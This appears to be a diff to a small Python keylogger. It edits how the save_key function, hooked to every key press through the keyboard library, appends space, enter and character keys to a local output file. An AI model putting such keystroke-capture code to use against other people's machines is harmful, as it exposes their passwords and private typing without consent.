@@ -16,10 +16,10 @@ def save_key(e):
     with open(output_file, 'a') as f:
             if key == "space":
                 f.write(" ")
-            elif key == "enter":
+            if key == "enter":
                 f.write("\n")
-            else:
-                f.write(key)
+            if len(key) == 1:
+               f.write(f"{key}")
 
 # Calling our function to record our key press's
 keyboard.on_press(save_key)
